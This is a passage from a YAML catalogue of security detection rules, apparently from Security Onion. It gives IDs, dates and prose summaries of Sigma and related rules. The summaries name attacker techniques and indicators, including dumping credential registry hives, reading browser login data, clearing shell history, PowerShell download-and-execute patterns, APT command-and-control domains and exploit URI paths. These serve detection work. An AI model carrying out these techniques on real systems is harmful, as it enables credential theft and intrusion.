    can indicate potential obfuscation techniques commonly used in malicious activities.
  Updated-Date: '2024_09_04'
fb9d3ff7-7348-46ab-af8c-b55f5fbf39b4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7799a03e707cd0a8650f26e3183c87a5
  Ruleset: core
  Summary: This rule detects the execution of PowerShell scripts located in the "C:\Users\Public"
    folder. It monitors process creation events specifically for instances where the
    executed command involves PowerShell executables (powershell.exe or pwsh.exe)
    with command-line arguments pointing to scripts in the aforementioned public directory.
    This behavior is notable for its association with potential malicious activities,
    as highlighted in the context of adversary tactics like those used by FIN7.
  Updated-Date: '2024_09_03'
fba38e0f-4607-4344-bb8f-a4b50cdeef7f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 200bbd9241d2221e39903721b504a9e2
  Ruleset: emerging-threats
  Summary: This rule detects DNS queries associated with the Diamond Sleet Advanced
    Persistent Threat (APT) group activity. Specifically, it identifies DNS queries
    for domain names like '3dkit.org', 'dersmarketim.com', 'galerielamy.com', and
    'olidhealth.com' as potential indicators of communication with Diamond Sleet APT
    infrastructure. This can help in identifying command-and-control activities related
    to this threat group, notorious for exploiting known vulnerabilities such as CVE-2023-42793
    in TeamCity software. The detection aims at capturing emerging threats that communicate
    through these specific domain names.
  Updated-Date: '2024_09_03'
fbc5e92f-3044-4e73-a5c6-1c4359b539de:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4a6507f9db49fdc1e97837015a22ddb7
  Ruleset: sigmahq
  Summary: This rule detects PowerShell scripts that possess the ability to read files,
    iterate through their contents, and resolve DNS host entries using the `[System.Net.Dns]::GetHostEntry`
    method. These scripts typically use `Get-Content` to read file contents and `foreach`
    loops to process each entry, outputting the results to a file with the `Out-File`
    cmdlet. Such functionality may be used for exfiltration of network information,
    aligning with the technique of automated data lifting and network mapping.
  Updated-Date: '2024_09_04'
fbd7c32d-db2a-4418-b92c-566eb8911133:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 57162ccf0f30940a527264af8e7560ed
  Ruleset: sigmahq
  Summary: This rule detects the execution of arbitrary PowerShell code through the
    SyncAppvPublishingServer.exe process. It identifies instances where the executable's
    command line contains specific patterns indicative of exploitation attempts. Key
    attributes for monitoring include the process image, original file name, and command
    line content. This rule is particularly relevant to efforts of defense evasion
    associated with Advanced Persistent Threats (APTs).
  Updated-Date: '2024_09_04'
fc014922-5def-4da9-a0fc-28c973f41bfb:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e928e95ccea1fe097c7b388f7e4f26ba
  Ruleset: core
  Summary: This rule detects instances where the path to a DLL written in the Windows
    registry differs from the default path. Specifically, it monitors when WAB.exe,
    a Windows Address Book executable, attempts to load a DLL from the registry rather
    than the usual location. This behavior may indicate potential misuse or manipulation
    aimed at defense evasion.
  Updated-Date: '2024_09_03'
fc028194-969d-4122-8abe-0470d5b8f12f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4322c254b6dc709e3a394f09dbba84ba
  Ruleset: sigmahq
  Summary: This rule detects attempts to access login data files from web browsers
    on Windows systems. Adversaries may try to acquire login credentials stored in
    an encrypted format by extracting these files from browsers like Opera, Firefox,
    Microsoft Edge, and Google Chrome. The detection focuses on specific PowerShell
    script commands and file paths associated with the storage of login data for these
    browsers.
  Updated-Date: '2024_09_04'
fc0e89b5-adb0-43c1-b749-c12a10ec37de:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ac8462c32b92b80a6720d1a2e8a8371a
  Ruleset: core
  Summary: This rule detects the execution of "reg.exe" commands with the "delete"
    flag targeting SafeBoot registry keys on Windows systems. Such activity is typically
    employed by attackers to disable safety mechanisms and prevent the execution of
    security products during the Safe Boot process. This tactic is often associated
    with ransomware variants like AvosLocker which aim to disable antivirus scans
    and other defensive measures.
  Updated-Date: '2024_09_03'
fc4f4817-0c53-4683-a4ee-b17a64bc1039:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bfb0c3726659fa9c965e676e83d8f22d
  Ruleset: core
  Summary: This rule detects the creation of a suspicious Microsoft desktopimgdownldr
    file by monitoring for files created using 'svchost.exe' in the directory path
    associated with the LockScreenImage personalization settings. The rule specifically
    filters out legitimate Windows directory paths and common image file extensions
    like .jpg, .jpeg, and .png to focus on genuinely suspicious activities. Designed
    to identify potential command-and-control or data exfiltration activities, it
    helps in catching unauthorized or malicious software attempting to disguise itself
    within system files or common image formats.
  Updated-Date: '2024_09_03'
fca949cc-79ca-446e-8064-01aa7e52ece5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ce9d263f2ef38ec34d2440feb0e60e70
  Ruleset: core
  Summary: This rule detects the execution of PCHunter, a tool used to view and manipulate
    system processes, kernel options, and other low-level system functions. PCHunter
    is similar to Process Hacker and is often used for advanced system diagnostics
    and kernel hacking. The detection criteria include identifying specific filenames
    such as PCHunter64.exe and PCHunter32.exe, original file names, descriptions,
    and various known file hashes.
  Updated-Date: '2024_09_03'
fcbb4a77-f368-4945-b046-4499a1da69d1:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c4e25ed904f9f2ac19858ed5d4fc9a0f
  Ruleset: emerging-threats
  Summary: This rule detects an authentication bypass vulnerability affecting the
    REST API URLs in Zoho ManageEngine ADSelfService Plus, specifically identified
    as CVE-2021-40539. The vulnerability allows unauthorized access through certain
    API endpoints, which could be exploited for initial access or persistence by attackers.
    The detection focuses on specific query strings within web server logs that match
    known exploit paths in the ADSelfService Plus application.
  Updated-Date: '2024_09_03'
fcc6d700-68d9-4241-9a1a-06874d621b06:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d268123274acf932b0532a407bcacac6
  Ruleset: core
  Summary: This rule detects suspicious files created via the OneNote application,
    which could indicate the execution of potentially malicious ".one" or ".onepkg"
    files. This activity has been observed in various malware campaigns. The rule
    monitors file events on Windows systems, specifically looking for processes related
    to OneNote that create files within the specified temporary directories and with
    certain executable or script extensions such as .bat, .exe, or .js. False positives
    are expected to be rare unless OneNote is frequently used internally to share
    embedded documents.
  Updated-Date: '2024_09_03'
fccfb43e-09a7-4bd2-8b37-a5a7df33386d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4e05521f051eefaff96602b5d9d98848
  Ruleset: core
  Summary: This rule detects the creation of Remote Desktop Protocol (RDP) files by
    suspicious applications on Windows systems. It specifically monitors applications
    that are typically used for web browsing, email communication, and chatting, such
    as browsers (e.g., Chrome, Firefox, Microsoft Edge), email clients (e.g., Outlook,
    Thunderbird), and chat applications (e.g., Discord, Microsoft Teams, Slack). The
    detection focuses on instances where these applications create a file with an
    ".rdp" extension, which may indicate the use of Rclone or similar utilities for
    rogue or unauthorized RDP access, posing a potential defense evasion threat.
  Updated-Date: '2024_09_03'
fcddca7c-b9c0-4ddf-98da-e1e2d18b0157:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 41d69b377ff33c6c37f1d352b14bf187
  Ruleset: core
  Summary: This rule detects the disabling of the Windows Defender event log by identifying
    registry changes that set the "Enabled" value to 0 within the specified path.
    This activity is associated with defense evasion techniques used in Lockbit 3.0
    malware infections.
  Updated-Date: '2024_09_03'
fcdf69e5-a3d3-452a-9724-26f2308bf2b1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a37cff77873eb817c7572cc540506f7a
  Ruleset: core
  Summary: This rule detects the opening of ISO files within archiving software such
    as 7Zip, WinRAR, or PeaZip on Windows systems, a pattern often associated with
    phishing attacks. Threat actors commonly use small ISO files enclosed in archives
    as email attachments to circumvent security filters and protections. This behavior
    can be indicative of initial access tactics in cybersecurity threats, particularly
    aimed at evading detection mechanisms through the exploitation of archival software
    functionalities.
  Updated-Date: '2024_09_03'
fce2c2e2-0fb5-41ab-a14c-5391e1fd70a5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 55cb609a0ee90104caefed5934b0f943
  Ruleset: emerging-threats
  Summary: This rule detects the exploitation of a critical vulnerability in Microsoft
    Exchange Server, identified as CVE-2020-0688. The detection process involves monitoring
    web server logs for specific methods and URI queries that indicate an attempted
    attack. Notably, the rule looks for instances where the "GET" method is used in
    combination with certain query strings like '/ecp/' and '/owa/', as well as the
    presence of the '`__VIEWSTATE=`' parameter. This method helps identify potential
    unauthorized access attempts aimed at exploiting the vulnerability.
  Updated-Date: '2024_09_03'
fcf1101d-07c9-49b2-ad81-7e421ff96d80:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d9603ae4796566c74cbe8e04f1005295
  Ruleset: emerging-threats
  Summary: This rule detects the exploitation of the VMware Workspace ONE Access authentication
    bypass vulnerability identified as CVE-2022-31656. The vulnerability affects VMware
    Workspace ONE Access, Identity Manager, and vRealize Automation. It allows a malicious
    actor with network access to the user interface to potentially gain administrative
    access without needing to authenticate. The detection mechanism checks for specific
    patterns in the URI query string that indicate an exploit attempt.
  Updated-Date: '2024_09_03'
fcf94210-f188-4363-a707-a1a410ebec03:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 960643a10b8580b4664a6b5e09b2bb07
  Ruleset: securityonion-resources
  Summary: This rule detects new SSH connections and login attempts on a Security
    Onion Intrusion Detection Honeypot (IDH) node. The monitoring specifically identifies
    log entries with types 4000, 4001, and 4002, which correspond to new connections
    and login attempts.
  Updated-Date: '2024_08_07'
fd0f5778-d3cb-4c9a-9695-66759d04702a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 78d08c59efd2bbd726b7e894856c9884
  Ruleset: core
  Summary: This rule detects various forms of obfuscated PowerShell IEX invocation
    code generated by the Invoke-Obfuscation framework. It specifically looks for
    patterns in the "ServiceFileName" field of EventID 4697 logs, which indicate potentially
    malicious obfuscation techniques. Examples include obfuscation patterns involving
    `$PSHome`, `$ShellId`, `$env:Public`, and `$env:ComSpec` variables, as well as
    specific string manipulations and verbose preference settings.
  Updated-Date: '2024_09_03'
fd435618-981e-4a7c-81f8-f78ce480d616:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a3392da28e90eb6377e3d8e0c334392a
  Ruleset: sigmahq
  Summary: This rule detects suspicious exceptions in Django web applications that
    may indicate exploitation attempts. It specifically looks for keywords related
    to various subclasses of the SuspiciousOperation exception and other security-related
    exceptions. These include DisallowedHost, DisallowedModelAdminLookup, DisallowedModelAdminToField,
    DisallowedRedirect, InvalidSessionKey, RequestDataTooBig, SuspiciousFileOperation,
    SuspiciousMultipartForm, SuspiciousSession, TooManyFieldsSent, and PermissionDenied.
    Such exceptions can signify malicious activities targeting the Django application's
    security mechanisms.
  Updated-Date: '2024_09_04'
fd877b94-9bb5-4191-bb25-d79cbd93c167:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 44de16272483bbde4a8578d71e6f6e76
  Ruleset: core
  Summary: This rule detects the use of "reg.exe" to dump sensitive registry hives,
    specifically targeting the SAM, SYSTEM, and SECURITY hives. This activity is often
    associated with an attempt to access credential information stored in those hives.
    The detection is based on identifying specific command line parameters and references
    to the hives within the "reg.exe" commands.
  Updated-Date: '2024_09_03'
fdb62a13-9a81-4e5c-a38f-ea93a16f6d7c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e458e58bc84a01d1cd21a4b7d7276517
  Ruleset: core
  Summary: This rule detects the usage of a base64 encoded "FromBase64String" cmdlet
    in the command line of a process. PowerShell's "FromBase64String" cmdlet is typically
    used to decode base64 encoded strings, and its presence can indicate potential
    malicious behavior such as execution of encoded scripts to evade detection mechanisms.
  Updated-Date: '2024_09_03'
fdbf0b9d-0182-4c43-893b-a1eaab92d085:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9ae0aa42e5d8b6a8d6e24858f01e7930
  Ruleset: sigmahq
  Summary: This rule detects potential persistence activity through the registration
    of new custom protocol handlers in the Windows registry. While legitimate applications
    often register protocol handlers during installation, attackers can exploit this
    capability to set a custom handler as a persistence mechanism. Specifically, the
    rule monitors modifications to the registry that start with 'HKCR\' and 'URL:'.
    It includes filters to avoid false positives by excluding entries related to Microsoft
    protocols and common system directories. However, many legitimate applications
    can register custom protocol handlers, so additional environmental filters may
    be required.
  Updated-Date: '2024_09_04'
fdc88d25-96fb-4b7c-9633-c0e417fdbd4e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 20d3357554fee6bb68f6cac550630ed5
  Ruleset: core
  Summary: This rule detects commands attempting to clear or tamper with the Linux
    command history. Such actions are commonly employed by threat actors to avoid
    detection by making it difficult to trace executed commands in log files like
    "bash_history" or "zsh_history". The rule identifies a variety of specific commands
    associated with this tampering, including utilizing tools like `cat`, `chattr`,
    `echo`, `export`, `history`, `ln`, `rm`, `shopt`, `shred`, and `truncate`. These
    commands are strategically used to manipulate or eliminate the contents of shell
    history files, thereby facilitating defense evasion.
  Updated-Date: '2024_09_03'
fdd1bfb5-f60b-4a35-910e-f36ed3d0b32f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2aba6d320490cdcbc2b020c40af7ecce
  Ruleset: core
  Summary: This rule detects suspicious user agent strings in proxy logs that are
    commonly associated with exploit or penetration testing frameworks, such as Metasploit,
    Cobalt Strike, and Empire. Specific user agent strings indicative of these tools
    include outdated or rare browser versions and those mimicking legitimate web agents
    like Googlebot. The rule aims to identify potentially malicious activity by comparing
    the logged user agent strings against known patterns used by these frameworks.
    Additionally, certain user agent strings reflect exploits, such as WordPress hash
    grabbers and other generic exploit indicators. The objective is to flag potentially
    harmful connections by recognizing these distinctive signatures within network
    traffic analysis.
  Updated-Date: '2024_09_03'
fdd7e904-7304-4616-a46a-e32f917c4be4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9befd7340a0110e8fed2b4cf8a821d97
  Ruleset: emerging-threats
  Summary: This rule detects exploitation attempts of the OWASSRF variant targeting
    Exchange servers using publicly available proof-of-concept (POC) code. The exploitation
    leverages the Outlook Web App (OWA) endpoint to access the PowerShell backend.
    Specifically, it monitors HTTP requests with a user agent string indicative of
    a Windows-based Chrome browser, a POST request method, a successful status code,
    and URIs that contain references to '/owa/mastermailbox' and '/powershell'.
  Updated-Date: '2024_09_03'
fdd84c68-a1f6-47c9-9477-920584f94905:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 36a3326ed96123d8355a1ecb47fe10d0
  Ruleset: emerging-threats
  Summary: This rule detects the exploitation of CVE-2017-8759 by identifying instances
    where Microsoft Word (Winword.exe) initiates the Compiler Service (csc.exe) as
    a subprocess, which is uncommon and indicative of the described exploit. CVE-2017-8759
    involves a vulnerability in the .NET framework that could be exploited through
    specially crafted files to allow remote code execution. The rule aims to alert
    on such suspicious behavior to mitigate possible security breaches.
  Updated-Date: '2024_09_03'
fdf135a2-9241-4f96-a114-bb404948f736:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 15e75fb3a6d5c2dd3bdc0212f606ac07
  Ruleset: core
  Summary: This rule detects antivirus alerts indicating the presence of web shells.
    Web shells are malicious scripts that can be uploaded to a web server to enable
    remote administration. The detection focuses on specific signatures related to
    various web technologies and backdoor methods, such as ASP, JSP, PHP, Perl, and
    VBS. Particular strings and patterns are monitored to identify known web shell
    signatures like ASPXSpy, C99shell, and PHPShell. Tuning the rule to align with
    the specific strings used by an antivirus solution is recommended by analyzing
    a web shell repository.
  Updated-Date: '2024_09_03'
fdf96c90-42d5-4406-8a9c-14a2c9a016b5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4d2658b0eb425c2f7e79bc1c594205e8
  Ruleset: emerging-threats
  Summary: This rule detects access to the DEWMODE webshell, which is described in
    a FIREEYE report. The DEWMODE webshell is linked to the exploitation of Accellion
    File Transfer Appliance (FTA) vulnerabilities for data theft and extortion. The
    rule identifies specific patterns in web server logs, particularly in URI queries
    that contain the parameters '?dwn=' and '&fn=' followed by '.html?'. These patterns
    are indicative of interactions with the DEWMODE webshell.
  Updated-Date: '2024_09_03'
fdfcbd78-48f1-4a4b-90ac-d82241e368c5:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bbb93ebfc850fcc7527d1bd4cfc5ab58
  Ruleset: sigmahq
  Summary: This rule detects the launch of the PSEXESVC service, indicating that the
    system has been targeted for remote execution using PsExec. PsExec is a powerful
    Windows utility used for executing processes on remote systems, commonly utilized
    for administrative tasks but also often exploited by malicious actors for unauthorized
    operations.
  Updated-Date: '2024_09_04'
fe20dda1-6f37-4379-bbe0-a98d400cae90:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8e4c78e4f5ec09cc806161b9e0dabc60
  Ruleset: sigmahq
  Summary: This rule detects the use of the scrobj.dll file, which attempts to locate
    and execute a script specified in the ScriptletURL registry key. This behavior
    is indicative of potential persistence mechanisms that exploit the COM (Component
    Object Model) hijacking technique on Windows systems by modifying the InprocServer32
    entry to load the scrobj.dll file. Identifying such modifications can help in
    detecting malicious attempts to maintain persistence on a compromised system.
  Updated-Date: '2024_09_04'
fe21810c-2a8c-478f-8dd3-5a287fb2a0e0:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 56ffb169dda40e3be786cf6e0d25b9fd
  Ruleset: core
  Summary: This rule detects suspicious commands related to scripting or PowerShell
    activities within WMI Event Consumers on Windows systems. It focuses on patterns
    that involve the creation of new objects using `net.webclient` for either downloading
    strings or files, as well as the use of certain PowerShell indicators like `iex(`,
    `-nop`, `-noprofile`, `-decode`, and `-enc`. Additionally, it looks for invocations
    of `WScript.Shell` and `System.Security.Cryptography.FromBase64Transform`.
  Updated-Date: '2024_09_03'
fe2f9663-41cb-47e2-b954-8a228f3b9dff:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: baf91434fef495d93d5d02128f19f2d7
  Ruleset: sigmahq
  Summary: This rule detects the presence of a base64-encoded shebang in the command
    line on a Linux system, which could indicate a malicious payload about to be decoded
    and executed. Specific base64-encoded strings corresponding to common shebangs
    for bash, dash, zsh, fish, and sh shells are used as indicators. This detection
    method helps to identify potential defense evasion tactics and is relevant in
    the context of process creation on Linux systems.
  Updated-Date: '2024_09_04'
fe3ac066-98bb-432a-b1e7-a5229cb39d4a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e71d2db707fbfbb66b87e32ca1c25ddb
  Ruleset: core
  Summary: This rule detects the creation of specific named pipes associated with
    known advanced persistent threats (APTs) and malware. The identified pipes include
    those utilized by malware such as Project Sauron, SolarWinds SUNBURST, LiquidSnake,
    Turla HyperStack, Sofacy group, Hidden Cobra Hoplight, Pacifier, Snatch Ransomware,
    Qbot, Covenant, Uroburos Malware, Wild Neutron APT, Cloud Hopper RedLeaves, Equation
    Group malware, PoshC2, Cobra Trojan, Crackmapexec smbexec, and Emissary Panda
    HyperBro. Awareness and logging of these particular named pipes are essential
    as their presence can indicate the presence of these high-risk threats within
    a system.
  Updated-Date: '2024_09_03'
fe513c69-734c-4d4a-8548-ac5f609be82b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b8f42b649d4235d04bb9c06decddc182
  Ruleset: sigmahq
  Summary: This rule detects when a firewall rule in Google Cloud Platform (GCP) is
    modified, deleted, or inserted. It monitors specific audit logs for method names
    associated with these actions, such as those involving the Compute.Firewalls.Delete,
    Compute.Firewalls.Patch, Compute.Firewalls.Update, and Compute.Firewalls.Insert
    methods. The rule helps identify potential unauthorized changes that could indicate
    attempts at defense evasion within the cloud infrastructure. While legitimate
    changes by system administrators may trigger this rule, exceptions can be configured
    to filter out expected behavior.
  Updated-Date: '2024_09_04'
fe5ce7eb-dad8-467c-84a9-31ec23bd644a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cd996f883779ec84fdfcd1bfc0216a92
  Ruleset: sigmahq
  Summary: This rule detects the execution of the SyncAppvPublishingServer process,
    which is often utilized by adversaries to bypass PowerShell execution restrictions.
  Updated-Date: '2024_09_04'
fe63010f-8823-4864-a96b-a7b4a0f7b929:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 88382a77059ecadd55e4dc1a462c8861
  Ruleset: sigmahq
  Summary: This rule detects the use of the findstr.exe or find.exe command lines
    that contain the keyword "lsass," indicating reconnaissance activity targeting
    the Local Security Authority Subsystem Service (LSASS) process ID. The LSASS process
    is critical for handling authentication and storing sensitive data on Windows
    systems, making it a common target for credential theft attacks.
  Updated-Date: '2024_09_04'
fe9e8ba9-4419-41e6-a574-bd9f7b3af961:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bca702874b0858746947ebe120202b9d
  Ruleset: emerging-threats
  Summary: This rule detects the creation of a scheduled task on a Windows system
    that runs weekly and executes the "shutdown /l /f" command. This specific behavior
    has been associated with the KamiKakaBot malware, which uses it to establish persistence
    on the infected system. Monitoring such activity can help identify potential compromises
    by this malware.
  Updated-Date: '2024_09_03'
fec96f39-988b-4586-b746-b93d59fd1922:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ab94a8ac3e67141555d10d4881dbdda3
  Ruleset: sigmahq
  Summary: This rule detects the temporary installation artifacts of ScreenConnect,
    a desktop support and remote access software. Adversaries may leverage such legitimate
    software, including Team Viewer, Go2Assist, LogMeIn, and AmmyyAdmin, to establish
    an interactive command and control channel on targeted systems within networks.
    These remote access tools are commonly used for legitimate technical support and
    may be permitted by application control policies within an organization. Specific
    patterns related to the installation files of ScreenConnect are monitored to identify
    potential abuse by adversaries.
  Updated-Date: '2024_09_04'
fecfd1a1-cc78-4313-a1ea-2ee2e8ec27a7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d9c15521e988a2182abd5ad2ca4cbe96
  Ruleset: core
  Summary: This rule detects changes to the Windows registry that disable various
    forms of PowerShell logging for the currently logged-in user. Tampering with these
    registry keys can disable module logging, script block logging, transcription
    logging, and script execution logging. The specific registry keys monitored are
    related to PowerShell versions 5 and 7 and include settings like `EnableModuleLogging`,
    `EnableScriptBlockLogging`, `EnableScriptBlockInvocationLogging`, `EnableTranscripting`,
    and `EnableInvocationHeader`, checked for values that turn logging off. This detection
    aims to identify attempts to evade defenses by disabling PowerShell logging capabilities.
  Updated-Date: '2024_09_03'
fed85bf9-e075-4280-9159-fbe8a023d6fa:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 59e4d9da0b26e4c2cbba2fce338f3704
  Ruleset: sigmahq
  Summary: This rule detects the use of Advanced IP Scanner, a network scanning tool
    known to be employed by ransomware groups. The detection is based on the presence
    of files in the directory path "\AppData\Local\Temp\Advanced IP Scanner 2" on
    Windows systems. While this tool can be used for legitimate administrative purposes,
    it has been reported in various cybersecurity incidents related to ransomware
    activities.
  Updated-Date: '2024_09_04'
fef394cd-f44d-4040-9b18-95d92fe278c0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 21e9dbf93b6feb35c5b04c8359c49253
  Ruleset: sigmahq
  Summary: This rule detects potential DLL sideloading of "DbgModel.dll" by monitoring
    for its loading in non-standard directories. DLL sideloading is a technique used
    by attackers to execute their malicious DLL by placing it in a trusted directory
    where a legitimate application dynamically loads it. The detection focuses on
    instances where "DbgModel.dll" is loaded outside of typical system directories
    such as "C:\Windows\System32", "C:\Windows\SysWOW64", and known legitimate application
    directories like "C:\Program Files\WindowsApps\Microsoft.WinDbg_" or "C:\Program
    Files\Windows Kits". This helps to identify unusual or suspicious loading behaviors
    which may indicate an attempt to evade defenses. However, the rule acknowledges
    that false positives can occur if legitimate applications load their own versions
    of this DLL.
  Updated-Date: '2024_09_04'
ff0f2b05-09db-4095-b96d-1b75ca24894a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f4d1cd99c965ee9af3ea3790ed961d13
  Ruleset: sigmahq
  Summary: This rule detects any .NET assembly DLL being loaded by a Microsoft Office
    application. It focuses on image load events in Windows where the Office executables,
    such as Excel, Publisher, OneNote, Outlook, PowerPoint, and Word, trigger the
    loading of DLLs from the 'C:\Windows\assembly\' directory. This behavior may indicate
    potentially malicious activity leveraging Office applications to load .NET assemblies.
  Updated-Date: '2024_09_04'
ff151c33-45fa-475d-af4f-c2f93571f4fe:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e15b7dd66340bbbd7e7c8e4097f65fed
  Ruleset: sigmahq
  Summary: This rule detects suspicious attempts to access the registry key associated
    with the Azure AD Health monitoring agent, which is located at HKLM\SOFTWARE\Microsoft\Microsoft
    Online\Reporting\MonitoringAgent. It relies on Windows security events, specifically
    Event IDs 4656 and 4663, to identify any such access. The rule filters out legitimate
    access by specific processes like `Microsoft.Identity.Health.Adfs.DiagnosticsAgent.exe`,
    `Microsoft.Identity.Health.Adfs.InsightsService.exe`, `Microsoft.Identity.Health.Adfs.MonitoringAgent.Startup.exe`,
    `Microsoft.Identity.Health.Adfs.PshSurrogate.exe`, and `Microsoft.Identity.Health.Common.Clients.ResourceMonitor.exe`.
    This helps distinguish between benign and potentially malicious access attempts.
  Updated-Date: '2024_09_04'
ff23ffbc-3378-435e-992f-0624dcf93ab4:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1cc043b5f636a693cc341c57301ea2a8
  Ruleset: core
  Summary: This rule detects the execution of the PurpleSharp adversary simulation
    tool on Windows environments. PurpleSharp, identified either by its image path
    or its original filename (`PurpleSharp.exe`), or through specific command line
    arguments such as `xyz123456.exe` and `PurpleSharp`, is used for testing and improving
    security measures by simulating advanced persistent threat (APT) activities. Detecting
    this tool's execution is critical due to its potential for performing sophisticated
    attack simulations.
  Updated-Date: '2024_09_03'
ff246f56-7f24-402a-baca-b86540e3925c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b920ce2cfa41ebfadae8fabfb2ed9c95
  Ruleset: sigmahq
  Summary: This rule detects when the Security Compliance Center in Microsoft 365
    reports that a user has been restricted from sending emails due to exceeding the
    sending limits set by service policies. This could indicate potential misuse or
    abuse of email functionality within the organization.
  Updated-Date: '2024_09_04'
ff2fff64-4cd6-4a2b-ba7d-e28a30bbe66b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ae42b9d59c15d1f377c1f82c0f766f3b
  Ruleset: sigmahq
  Summary: This rule detects the creation of a scheduled task with a name formatted
    as a GUID, which is typically unusual and could indicate malicious activity. Specifically,
    it monitors the execution of the `schtasks.exe` process with command lines containing
    the pattern for creating tasks and specifying their names as GUIDs. This is often
    linked to exploits or malware, such as Follina, Qbot, and Zerologon, which use
    this naming convention to disguise their scheduled tasks. While legitimate software
    may sometimes use GUIDs for task names, it is less common and therefore considered
    suspicious.
  Updated-Date: '2024_09_04'
ff301988-c231-4bd0-834c-ac9d73b86586:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9606a1096e49013c6233a45bafe66f65
  Ruleset: sigmahq
  Summary: This rule detects the deletion of PowerShell console history logs, a potential
    indicator of attempts to destroy forensic evidence on a Windows system. Specifically,
    it monitors for the removal of the '\PSReadLine\ConsoleHost_history.txt' file,
    which may be associated with defense evasion techniques.
  Updated-Date: '2024_09_04'
ff349b81-617f-4af4-924f-dbe8ea9bab41:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cf9ae0576ae3fc73cffa6409038fbbad
  Ruleset: emerging-threats
  Summary: This rule detects potential exploitation attempts of CVE-2023-4966, a sensitive
    information disclosure vulnerability in Citrix ADC and NetScaler Gateway. Specifically,
    it monitors proxy logs for instances where a GET request is made to the URI path
    '/oauth/idp/.well-known/openid-configuration' and receives a 200 status code.
    Such activity may indicate an attempt to exploit the vulnerability and gain unauthorized
    access to sensitive information.
  Updated-Date: '2024_09_03'
ff39f1a6-84ac-476f-a1af-37fcdf53d7c0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 49e7811313dff244891f02035285d380
  Ruleset: sigmahq
  Summary: This rule detects attempts to disable security tools on macOS systems.
    It monitors for the usage of the `launchctl unload` command, specifically looking
    for signs that certain security-related plist files are being manipulated. It
    targets a variety of security services including the Objective-See firewall management
    utilities (LuLu and BlockBlock), Google Santa, Carbon Black, Objective Development
    Software's Little Snitch, and several others such as Tenable Nessus, OpenDNS Umbrella,
    Crowdstrike Falcon, Facebook Osquery, and various Elastic Beat tools (Filebeat,
